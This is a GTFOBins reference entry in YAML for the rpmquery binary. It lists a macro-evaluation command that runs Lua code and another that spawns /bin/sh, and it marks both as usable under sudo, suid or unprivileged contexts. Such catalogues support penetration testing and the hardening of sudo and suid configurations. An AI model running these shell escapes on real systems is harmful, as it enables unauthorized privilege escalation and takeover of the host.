<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/rpmquery -->
---
functions:
  inherit:
  - code: |-
      rpmquery --eval '%{lua:...}'
    comment: |-
      This allows to run Lua code (`...`).
    contexts:
      sudo:
      suid:
      unprivileged:
    from: lua
    version: |-
      Some older version is required.
  shell:
  - code: |-
      rpmquery --eval '%(/bin/sh 1>&2)'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
